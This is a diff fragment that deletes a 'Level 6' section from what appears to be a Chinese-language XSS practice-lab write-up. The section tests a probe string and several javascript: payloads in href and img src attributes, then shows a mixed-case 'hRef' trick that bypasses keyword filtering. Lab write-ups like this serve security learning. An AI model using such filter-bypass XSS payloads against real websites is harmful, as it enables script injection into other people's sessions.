@@ -130,35 +130,3 @@ payload:
 
 
 
-# Level 6
-![Pasted image 20240826202233.png](/img/user/picture/Pasted%20image%2020240826202233.png)
-
-还是测试一下：
-```
-'';!--"<XSS>=&{()}
-```
-
-![Pasted image 20240826210403.png](/img/user/picture/Pasted%20image%2020240826210403.png)
-
-
-用上一关的payload试一下：
-```
-"><a href="javascript:alert(`xss`);">xss</a>
-```
-![Pasted image 20240826210514.png](/img/user/picture/Pasted%20image%2020240826210514.png)
-发现href关键词也被过滤了
-
-用另一个试一下：
-```
-sd"></br><img src="javascript:alert('1');">
-```
-![Pasted image 20240826210653.png](/img/user/picture/Pasted%20image%2020240826210653.png)
-发现src关键词也被过滤了
-
-这题可以用大小写绕过
-
-```
-"><a hRef="javascript:alert(`xss`);">xss</a>
-```
-
-
